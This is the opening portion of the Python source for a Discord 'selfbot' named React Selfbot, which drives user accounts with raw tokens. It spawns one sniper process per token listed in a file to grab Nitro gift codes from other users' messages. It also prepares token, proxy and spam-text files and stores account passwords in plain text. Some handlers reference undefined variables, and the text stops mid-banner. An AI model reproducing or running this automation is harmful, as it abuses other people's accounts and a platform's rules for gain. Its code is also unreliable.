#coding=utf-8
from __future__ import print_function, unicode_literals

import asyncio
import base64
import codecs
import contextlib
import copy
import datetime as date
import getpass
import hashlib
import html as html_parser
import inspect
import json
import math
import os
import platform
import random
import re
import shutil
import smtplib
import socket
import string
import subprocess
import sys
import time
import urllib.parse
import urllib.request
import warnings
import webbrowser
from datetime import datetime, timedelta, timezone
from io import StringIO
from math import sqrt
from random import randrange
from time import monotonic
import shutil

import aiohttp
import asyncpraw
import cursor
import discord
import ffmpeg
import jwt
import httpx
import markdown
import ntplib
import numpy
import playsound
import praw
import privatebinapi
import psutil
import pyPrivnote as pn
import qrcode
import requests
import upsidedown
import urbandict as ud
import youtube_dl
import youtube_dl as ytdl
from bs4 import BeautifulSoup
from colorama import Back, Fore, Style, init
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from discord.ext import commands, tasks
from google_trans_new import google_translator
from gtts import gTTS
from lorem_text import lorem
from pyfiglet import Figlet
from pypresence import Presence
from requests_futures.sessions import FuturesSession
from sty import RgbFg, Style, bg, ef, fg, rs
from tcp_latency import measure_latency

from notify import QueryNotifyPrint
from result import QueryResult, QueryStatus
from sites import SitesInformation

warnings.filterwarnings("ignore")
warnings.filterwarnings("ignore", category = DeprecationWarning)

if sys.platform == "win32":

    import cursor
    import wmi
    from win10toast import ToastNotifier

    # os.environ['PYGAME_HIDE_SUPPORT_PROMPT'] = "hide"
    # import OpenGL.GL as gl
    # import pygame
else:
    import platform

    import distro
    
import multiprocessing as mp
if sys.platform.startswith('linux'):
    pass

afk_stat = 0
uwu_stat = 0
mock_stat = 0
status_stat = 0
online_status_cycle_stat = 0
current_hypesquad = 1
hypesquad_cycle_stat = 0

fg.orange = Style(RgbFg(255, 150, 50))
fg.darkorange = Style(RgbFg(235,97,35))
fg.lightorange = Style(RgbFg(234,95,33))
fg.lightgrey = Style(RgbFg(114,114,114))
fg.yellow = Style(RgbFg(255,255,0))

fg.orange1 = Style(RgbFg(190,75,0))
fg.orange2 = Style(RgbFg(196,93,25))
fg.orange3 = Style(RgbFg(255,127,0))
fg.orange4 = Style(RgbFg(223,101,0))
fg.hwred = Style(RgbFg(140,43,25))

fg.green = Style(RgbFg(0,255,0))

fg.purple3 = Style(RgbFg(86,88,221))

version = '1.3.8'

snipe_message_content = None
snipe_message_author = None
snipe_message_id = None
snipe_message_server = None

prefix = None
color = None
embed_color = 0x00ffff
embed_footer = None
embed_footer_url = None
embed_thumbnail_url = None
delete_timeout = None
rich_presence = None
global_emoji = None
token = None
embed_mode = None
nitro_sniper = None
nitro_webhook_url = None
privnote_webhook_url = None
giveaways_webhook_url = None
giveaway_server_joiner = None
stream_url = None
giveaway_blocked_words = None
selfbot_user_detection = None
selfbot_detection_webhook = None
ghostping_detection = None
ghostping_detection_webhook = None
command_usage_webhook = None
dm_delete_notify = None
dm_delete_notify_webhook_url = None
footer_timestamp = False
discord_password = None

statuscycle = False
current_status = 0

current_online_status = 0

theme_shuffle = False

command_history = []
remote_selfbot_users = []
semi_muted = []
status_cycle_words = []
lockedusers = []
lockedgroups = []

giveaway_msg_id = None
giveaway_entries = []

nwordcounter = 0

nitroRegex = re.compile('(discord.com/gifts/|discordapp.com/gifts/|discord.gift/)([a-zA-Z0-9]+)')

currenttheme = 'default'

def parse_embed_to_codeblock(embed: discord.Embed):

    if not embed.image:
        code_block_builder = """```asciidoc
{}{}{}{}{}
```
""".format(f"= {embed.author.name} =" + "\n\n" if embed.author.name and embed.author.name != "" else "", f"[ {embed.title.replace('**', '')} ]" + "\n\n", embed.description.replace('**', '').replace('`', '') + "\n" if embed.description else "", """\n""".join([f"- {field.name.replace('__', '')}" + "\n" + f"{field.value.replace('**', '').replace('`', '')}" + "\n" for field in embed.fields]) if embed.fields else "", "\n" + embed.footer.text if embed.footer.text else "")
        return code_block_builder
    else:
        return embed.image.url

def drone_startup(pos, token):
    drone_bot = commands.Bot(command_prefix = "LMAOBRUH", self_bot = True)
        
    @drone_bot.listen()
    async def on_message(msg):
        try:
            if json.load(open('config.json', encoding='utf-8'))['nitro_sniper'] == True and nitroRegex.search(msg.content):
                code = nitroRegex.search(msg.content).group(2)
                if len(code) >= 16:
                    async with httpx.AsyncClient() as client:    
                        start_time = time.time()
                        result = await client.post(f'https://canary.discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem', json={'channel_id': msg.channel.id}, headers={'authorization': json.load(open('config.json', encoding='utf-8'))['token'], 'user-agent': 'Mozilla/5.0'})
                        elapsed = '%.3fs' % (time.time() - start_time)
                    status = 'Ratelimit'
                    web_status = 'None'
                    ping = False
                    if 'This gift has been redeemed already' in str(result.content):
                        status = f'{fg.red}Already redeemed'
                        web_status = 'Already redeemed'
                    elif 'nitro' in str(result.content):
                        status = f'{fg.green}Successfully redeemed!'
                        web_status = 'Successfully redeemed!'
                        ping = True
                    elif 'Unknown Gift Code' in str(result.content):
                        status = f'{fg.yellow}Unknown/Invalid'
                        web_status = 'Unknown/Invalid'
                           
                    print(f'{fg.white}[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Nitro'
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Author: {fg.white}{msg.author}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Elapsed: {fg.white}{elapsed}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Code: {fg.white}{code}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Status: {status}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Sniper: {fg.white}{pos + 1}")
                    if ping:
                        if json.load(open('config.json', encoding='utf-8'))['nitro_redeem_notify'] and sys.platform == "win32":
                            try:
                                toaster.show_toast("Nitro Sniper", f"Successfully redeemed a Nitro code! \nServer: {msg.guild} \nAuthor: {msg.author}\nChannel: {msg.channel}", icon_path="react.ico", duration=2)
                            except:
                                pass
                        payload = json.dumps({
                        "content": f"<@{React.user.id}>",
                        "embeds": [
                            {
                            "title": "React Nitro Sniper Webhook",
                            "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                            "thumbnail": {
                                "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                            },
                            "fields": [
                                {
                                "name": "__üç≠ Code__",
                                "value": f'{code}',
                                "inline": "true"
                                },
                                {
                                "name": "__‚è± Time Elapsed__",
                                "value": f'{elapsed}',
                                "inline": "true"
                                },
                                {
                                "name": "__üéÄ Status__",
                                "value": f'{web_status}',
                                "inline": "true"
                                },
                                {
                                "name": "__üß¨ Author__",
                                "value": f'{msg.author}',
                                "inline": "true"
                                },
                                {
                                "name": "__üõã Server__",
                                "value": f'{msg.guild}',
                                "inline": "true"
                                },
                                {
                                "name": "__ü•§ Channel__",
                                "value": f'{msg.channel}',
                                "inline": "true"
                                },
                                {
                                "name": "__üîó Jump to channel__",
                                "value": f'[Jump URL]({msg.jump_url})',
                                "inline": "true"
                                }
                            ],
                            "footer": {
                                "text": f"React Selfbot (Sniper {pos + 1})"
                            }
                            }
                        ]
                        })
                    else:
                        payload = json.dumps({
                        "embeds": [
                            {
                            "title": "React Nitro Sniper Webhook",
                            "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                            "thumbnail": {
                                "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                            },
                            "fields": [
                                {
                                "name": "__üç≠ Code__",
                                "value": f'{code}',
                                "inline": "true"
                                },
                                {
                                "name": "__‚è± Time Elapsed__",
                                "value": f'{elapsed}',
                                "inline": "true"
                                },
                                {
                                "name": "__üéÄ Status__",
                                "value": f'{web_status}',
                                "inline": "true"
                                },
                                {
                                "name": "__üß¨ Author__",
                                "value": f'{msg.author}',
                                "inline": "true"
                                },
                                {
                                "name": "__üõã Server__",
                                "value": f'{msg.guild}',
                                "inline": "true"
                                },
                                {
                                "name": "__ü•§ Channel__",
                                "value": f'{msg.channel}',
                                "inline": "true"
                                },
                                {
                                "name": "__üîó Jump to channel__",
                                "value": f'[Jump URL]({msg.jump_url})',
                                "inline": "true"
                                }
                            ],
                            "footer": {
                                "text": f"React Selfbot (Sniper {pos + 1})"
                            }
                            }
                        ]
                        })

                    try:
                        requests.post(json.load(open('config.json', encoding='utf-8'))['nitro_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                    except Exception:
                        pass

                    if json.load(open('config.json', encoding='utf-8'))['nitro_sound'] == True:
                        try:
                            playsound.playsound("./Sound/success.mp3")
                        except:
                            pass
                else:                 
                    print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Nitro'
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Author: {fg.white}{msg.author}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Code: {fg.white}{code}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Status: {fg.red}Fake"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Sniper: {pos + 1}")
        except Exception:
            pass

    @drone_bot.listen()
    async def on_message_edit(before, after):
        try:
            if json.load(open('config.json', encoding='utf-8'))['nitro_sniper'] == True and nitroRegex.search(after.content) and after.channel not in ignored_nitro_channels:
                code = nitroRegex.search(msg.content).group(2)
                if len(code) >= 16 and code not in already_redeemed:
                    async with httpx.AsyncClient() as client:    
                        start_time = time.time()
                        result = await client.post(f'https://canary.discordapp.com/api/v8/entitlements/gift-codes/{code}/redeem', json={'channel_id': after.channel.id}, headers={'authorization': token, 'user-agent': 'Mozilla/5.0'})
                        elapsed = '%.3fs' % (time.time() - start_time)
                    
                    status = 'Ratelimit'
                    web_status = 'None'
                    ping = False
                    if 'This gift has been redeemed already' in str(result.content):
                        status = f'{fg.red}Already redeemed'
                        web_status = 'Already redeemed'
                    elif 'nitro' in str(result.content):
                        status = f'{fg.green}Successfully redeemed!'
                        web_status = 'Successfully redeemed!'
                        ping = True
                    elif 'Unknown Gift Code' in str(result.content):
                        status = f'{fg.yellow}Unknown/Invalid'
                        web_status = 'Unknown/Invalid'
                        
                    print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Nitro'              
                        f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{after.guild}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Author: {fg.white}{after.author}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{after.channel}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Elapsed: {fg.white}{elapsed}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Code: {fg.white}{code}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Status: {status}")
                    already_redeemed.append(code)
                    if ping:
                        if json.load(open('config.json', encoding='utf-8'))['nitro_redeem_notify'] and sys.platform == "win32":
                            try:
                                toaster.show_toast("Nitro Sniper", f"Successfully redeemed a Nitro code! \nServer: {after.guild} \nAuthor: {after.author}\nChannel: {after.channel}", icon_path="react.ico", duration=2)
                            except:
                                pass
                        payload = json.dumps({
                        "content": f"<@{React.user.id}>",
                        "embeds": [
                            {
                            "title": "React Nitro Sniper Webhook",
                            "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                            "thumbnail": {
                                "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                            },
                            "fields": [
                                {
                                "name": "__üç≠ Code__",
                                "value": f'{code}',
                                "inline": "true"
                                },
                                {
                                "name": "__‚è± Time Elapsed__",
                                "value": f'{elapsed}',
                                "inline": "true"
                                },
                                {
                                "name": "__üéÄ Status__",
                                "value": f'{web_status}',
                                "inline": "true"
                                },
                                {
                                "name": "__üß¨ Author__",
                                "value": f'{after.author}',
                                "inline": "true"
                                },
                                {
                                "name": "__üõã Server__",
                                "value": f'{after.guild}',
                                "inline": "true"
                                },
                                {
                                "name": "__ü•§ Channel__",
                                "value": f'{after.channel}',
                                "inline": "true"
                                },
                                {
                                "name": "__üîó Jump to channel__",
                                "value": f'[Jump URL]({after.jump_url})',
                                "inline": "true"
                                }
                            ],
                            "footer": {
                                "text": f"React Selfbot (Sniper {pos + 1})"
                            }
                            }
                        ]
                        })
                    else:
                        payload = json.dumps({
                        "embeds": [
                            {
                            "title": "React Nitro Sniper Webhook",
                            "color": int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0),
                            "thumbnail": {
                                "url": json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url']
                            },
                            "fields": [
                                {
                                "name": "__üç≠ Code__",
                                "value": f'{code}',
                                "inline": "true"
                                },
                                {
                                "name": "__‚è± Time Elapsed__",
                                "value": f'{elapsed}',
                                "inline": "true"
                                },
                                {
                                "name": "__üéÄ Status__",
                                "value": f'{web_status}',
                                "inline": "true"
                                },
                                {
                                "name": "__üß¨ Author__",
                                "value": f'{after.author}',
                                "inline": "true"
                                },
                                {
                                "name": "__üõã Server__",
                                "value": f'{after.guild}',
                                "inline": "true"
                                },
                                {
                                "name": "__ü•§ Channel__",
                                "value": f'{after.channel}',
                                "inline": "true"
                                },
                                {
                                "name": "__üîó Jump to channel__",
                                "value": f'[Jump URL]({after.jump_url})',
                                "inline": "true"
                                }
                            ],
                            "footer": {
                                "text": f"React Selfbot (Sniper {pos + 1})"
                            }
                            }
                        ]
                        })

                    try:
                        requests.post(json.load(open('config.json', encoding='utf-8'))['nitro_webhook_url'], data=payload.encode(), headers={'Content-Type': 'application/json', 'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'})
                    except Exception:
                        pass

                else:
                    print(fg.white + f'[{ fg.purple3 + datetime.now().strftime("%H:%M:%S") + fg.white}] Sniper | ' + fg.purple3 + 'Type: Nitro')                    
                    print(f"{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Server: {fg.white}{msg.guild}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Author: {fg.white}{msg.author}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Channel: {fg.white}{msg.channel}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Code: {fg.white}{code}"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Status: {fg.red}Fake"
                        f"\n{fg.white}[{ fg.purple3 + datetime.now().strftime('%H:%M:%S') + fg.white}] Sniper | Sniper: {pos + 1}")
        except Exception:
            pass

    drone_bot.run(token, bot = False)

RPC = None

def main():
    if sys.platform == "win32":
        toaster = ToastNotifier()
        os.system('color')
    def GetUUID():
        if sys.platform == "win32":
            cmd = 'wmic csproduct get uuid'
            uuid = str(subprocess.check_output(cmd))
            pos1 = uuid.find("\\n")+2
            uuid = uuid[pos1:-15]
        else:
            try:
                uuid = os.popen("lscpu | grep -E 'family|cache|Model|Hypervisor|Core|CPU(s)|Architecture|op-mode|Socket|Vendor|Virtualization|Flags'").read()
            except:
                print("Please install util-linux")
        return uuid

    # versionrequest = requests.get('https://reactselfbot.pro/api/info.php').json()['version']
    versionrequest = "1.3.8"

    if versionrequest != str(version):
        print(f'{fg.blue}A new update is available, please run the updater or redownload the files if you\'re using Linux.{fg.rs}')
        if sys.platform == "win32":
            os.system("pause")
        sys.exit()
    
    if not os.path.exists('react.ico'):
        iconreq = requests.get('https://reactselfbot.pro/download/favicon.ico', allow_redirects=True)
        open('react.ico', 'wb').write(iconreq.content)
    
    defaultconfig = '''{
    "username": "Username",
    "password": "Password",
    "token": "DiscordToken",
    "discord_password": "DiscordPassword",
    "prefix": "ChoosePrefix",
    "delete_timeout": 40,
    "delete_commands": true,
    "embed_mode": true,
    "theme": "default",
    "theme_shuffle": false,
    "language": "default",
    "selfbot_user_detection": true,
    "nitro_sniper": true,
    "nitro_sound": false,
    "nitro_webhook_url": "OPTIONAL",
    "giveaway_sniper": true,
    "giveaway_sound": false,
    "giveaway_timeout": 200,
    "giveaway_server_joiner": true,
    "giveaways_webhook_url": "OPTIONAL",
    "giveaway_blocked_words": ["ban", "selfbot"],
    "ignore_pings": false,
    "ignore_all_pings": false,
    "privnote_sniper": true,
    "privnote_sound": false,
    "privnote_webhook_url": "OPTIONAL",
    "selfbot_detection_webhook": "OPTIONAL",
    "selfbot_sound": false,
    "ghostping_detection": true,
    "ghostping_sound": false,
    "ghostping_detection_webhook": "OPTIONAL",
    "command_usage_webhook": "OPTIONAL",
    "rich_presence": {
        "enabled": false,
        "custom_mode": false,
        "application_id": 819235053879164969,
        "details": "Using React",
        "state": "Bullying Discord",
        "large_image": "react",
        "large_image_text": "https://reactselfbot.pro/",
        "small_image": "react",
        "small_image_text": "https://reactselfbot.pro/",
        "time": false,
        "buttons": {
            "button_one_label": "React Selfbot",
            "button_one_url": "https://reactselfbot.pro",
            "button_two_label": "Funny Video",
            "button_two_url": "https://www.youtube.com/watch?v=dQw4w9WgXcQ"
        }
    },
    "dm_delete_notify_webhook_url": "OPTIONAL",
    "dm_delete_sound": false,
    "watcher_webhook_url": "OPTIONAL",
    "watched_users": [],
    "afk_message": "I'm currently unreachable, please try to contact me later.",
    "stream_url": "https://twitch.tv/monstercat",
    "block_dms": false,
    "block_incoming_friends": false,
    "server_ban_detection": false,
    "ban_sound": false,
    "server_ban_webhook": "OPTIONAL",
    "ticket_detection": false,
    "ticket_sound": false,
    "ticket_webhook_url": "OPTIONAL",
    "relationship_detection": false,
    "relationship_sound": false,
    "relationship_webhook_url": "OPTIONAL",
    "relationship_notify": false,
    "role_update_sound": false,
    "role_update_notify": false,
    "role_update_webhook": "OPTIONAL",
    "nickname_update_sound": false,
    "nickname_update_notify": false,
    "nickname_update_webhook": "OPTIONAL",
    "ticket_notify": false,
    "server_ban_notify": false,
    "deleted_dm_notify": false,
    "nitro_redeem_notify": false,
    "ghostping_notify": false,
    "privnote_snipe_notify": false,
    "giveaway_win_notify": false,
    "giveaway_join_notify": false,
    "selfbot_detection_notify": false,
    "sleek_api_token": "OPTIONAL"
}'''
    
    if not os.path.exists('config.json'):
        with open('config.json', 'w') as f:
            f.write(defaultconfig)
            
    if os.path.exists('config.json'):
        with open("config.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        defaultdata = json.loads(defaultconfig)
        
        for key, value in defaultdata.items():
            try:
                data[key]
            except:
                data[key] = value
        
        with open("config.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
    defaulttheme = '''
{
    "footer_timestamp": false,
    "selfbot_title": "React Selfbot",
    "embed_title_url": "",
    "global_emoji": "üíú",
    "embed_color": "#5658dd",
    "embed_author_name": "",
    "embed_author_icon_url": "",
    "embed_author_url": "",
    "embed_thumbnail_url": "https://reactselfbot.pro/logo512.png",
    "embed_footer_url": "https://reactselfbot.pro/logo512.png",
    "embed_footer": "reactselfbot.pro"
}
'''
            
    if not os.path.exists('Themes'):
        os.mkdir('Themes')
        with open('./Themes/default.json', 'w', encoding="utf-8") as f:
            f.write(defaulttheme)
            
    if not os.path.exists('./Themes/default.json'):
        with open("./Themes/default.json", "w", encoding="utf-8") as f:
            f.write(defaulttheme)
    
    if os.path.exists('./Themes/default.json'):
        with open("./Themes/default.json", "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        defaultdata = json.loads(defaulttheme)
        
        for key, value in defaultdata.items():
            try:
                data[key]
            except:
                data[key] = value
        
        with open("./Themes/default.json", "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
            
    currenttheme = json.load(open('config.json', encoding='utf-8'))['theme']

    if not os.path.exists('DetectedSelfbotUsers.json'):
        with open('DetectedSelfbotUsers.json', 'w') as f:
            f.write('''
{

}
''')

    if not os.path.exists('TODO.json'):
            with open('TODO.json', 'w') as f:
                f.write('''
    {
        "TODO": []
    }
    ''')
            
    if not os.path.exists('Proxies.txt'):
        with open('Proxies.txt', 'w') as f:
            f.write('')
            
    if not os.path.exists('Tokens.txt'):
        with open('Tokens.txt', 'w') as f:
            f.write('')

    if not os.path.exists('FavoriteCommands.txt'):
        with open('FavoriteCommands.txt', 'w') as f:
            f.write('')
            
    if not os.path.exists('Spam.txt'):
        with open('Spam.txt', 'w') as f:
            f.write('''We're no strangers to love
You know the rules and so do I
A full commitment's what I'm thinking of
You wouldn't get this from any other guy
I just wanna tell you how I'm feeling
Gotta make you understand
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
We've known each other for so long
Your heart's been aching but you're too shy to say it
Inside we both know what's been going on
We know the game and we're gonna play it
And if you ask me how I'm feeling
Don't tell me you're too blind to see
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give, never gonna give
(Give you up)
(Ooh) Never gonna give, never gonna give
(Give you up)
We've known each other for so long
Your heart's been aching but you're too shy to say it
Inside we both know what's been going on
We know the game and we're gonna play it
I just wanna tell you how I'm feeling
Gotta make you understand
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt you
Never gonna give you up
Never gonna let you down
Never gonna run around and desert you
Never gonna make you cry
Never gonna say goodbye
Never gonna tell a lie and hurt...''')
            
    if not os.path.exists('SniperTokens.txt'):
        with open('SniperTokens.txt', 'w') as f:
            f.write('')

    if not os.path.exists('DisabledCommands.txt'):
        with open('DisabledCommands.txt', 'w') as f:
            f.write('')

    if not os.path.exists('Statuses.txt'):
        with open('Statuses.txt', 'w') as f:
            f.write('')
        
    if not os.path.exists('CustomCommands.json'):
        with open('CustomCommands.json', 'w') as f:
            f.write('{}')

    if not os.path.exists('GiveawayBots.json'):
        with open('GiveawayBots.json', 'w', encoding="utf-8") as f:
            f.write('''{
    "716967712844414996": "üéâ",
    "294882584201003009": "üéâ",
    "679379155590184966": "üéâ",
    "649604306596528138": "üéâ",
    "574812330760863744": "üéÅ",
    "673918978178940951": "üéâ",
    "720351927581278219": "üéâ",
    "530082442967646230": "üéâ",
    "486970979290054676": "üéâ",
    "582537632991543307": "üéâ",
    "396464677032427530": "üéâ",
    "732003715426287676": "üéÅ",
    "606026008109514762": "üéâ",
    "797025321958244382": "üéâ",
    "570338970261782559": "üéâ",
    "806644708973346876": "üéâ",
    "712783461609635920": "üéâ"
}''')

    if not os.path.exists('Sound'):
        os.mkdir('Sound')

        # if not os.path.exists('./Sound/connected.mp3'):
        #     open('./Sound/connected.mp3', 'wb').write(requests.get('https://reactselfbot.pro/download/connected.mp3', allow_redirects=True).content)

        # if not os.path.exists('./Sound/failure.mp3'):
        #     open('./Sound/failure.mp3', 'wb').write(requests.get('https://reactselfbot.pro/download/failure.mp3', allow_redirects=True).content)

        # if not os.path.exists('./Sound/information.mp3'):
        #     open('./Sound/information.mp3', 'wb').write(requests.get('https://reactselfbot.pro/download/information.mp3', allow_redirects=True).content)

        # if not os.path.exists('./Sound/notification.mp3'):
        #     open('./Sound/notification.mp3', 'wb').write(requests.get('https://reactselfbot.pro/download/notification.mp3', allow_redirects=True).content)

        # if not os.path.exists('./Sound/selfbot.mp3'):
        #     open('./Sound/selfbot.mp3', 'wb').write(requests.get('https://reactselfbot.pro/download/selfbot.mp3', allow_redirects=True).content)

        # if not os.path.exists('./Sound/success.mp3'):
        #     open('./Sound/success.mp3', 'wb').write(requests.get('https://reactselfbot.pro/download/success.mp3', allow_redirects=True).content)
            
    if not os.path.exists('Scripts'):
        os.mkdir('Scripts')
        with open('./Scripts/example.py', 'w') as f:
            f.write('''@React.command()
async def helloworld(ctx):
    await ctx.send("Hello world!")
                    ''')

    def theme_checkup():
        with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', "r", encoding="utf-8") as jsonFile:
            data = json.load(jsonFile)
            
        defaultdata = json.loads(defaulttheme)
        
        for key, value in defaultdata.items():
            try:
                data[key]
            except:
                data[key] = value
        
        with open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json', "w", encoding="utf-8") as jsonFile:
            json.dump(data, jsonFile, indent=4, sort_keys=False)
    theme_checkup()

    color = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color']
    try:
        embed_color = int(color.replace('#', '0x'), 0)
    except:
        embed_color = 0x00ffff

    if json.load(open('config.json', encoding='utf-8'))['rich_presence']['enabled'] == True:
        try:
            global RPC
            if not json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['custom_mode']:
                RPC = Presence('797712265545646111')
                RPC.connect()
                RPC.update(state="Using React", 
                    large_image='react', 
                    start=time.time(), 
                    buttons=[{"label": "üíú React Selfbot üíú", "url": "https://reactselfbot.pro"}]
                )
            else:
                RPC = Presence(json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['application_id'])
                RPC.connect()
                RPC.update(state=json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['state'], 
                details=json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['details'], 
                large_image=json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['large_image'], 
                large_text=json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['large_image_text'], 
                small_image=json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['small_image'], 
                small_text=json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['small_image_text'], 
                start=time.time() if json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['time'] else None, 
                buttons=[
                    {"label": json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"]
                    , "url": json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]
                    }, 
                    {"label": json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"],
                     "url": json.load(open('config.json', 'r', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]
                     }]
                )
        except:
            pass
    
    # if sys.platform.startswith('linux'):
    with open("SniperTokens.txt", "r") as file:
        try:
            processes = []
            tokens = file.readlines()
            for pos in range(len(tokens)):
                tokens[pos] = tokens[pos].replace("\n", "")
            for pos, token in enumerate(tokens):
                p = mp.Process(target=drone_startup, args=(pos, token))
                processes.append(p)
                p.start()
        except Exception as e:
            print(fg.purple3 + "An Error occurred while spawning sniper threads. Further information below. You can safely ignore this, other usage is not affected.")
            print(e)
            os.system("pause")
    
    print(bg.black)
    print('\n')    
    print(fg.purple3 + f'‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó ‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó  ‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ñà‚ïó'.center(shutil.get_terminal_size().columns))
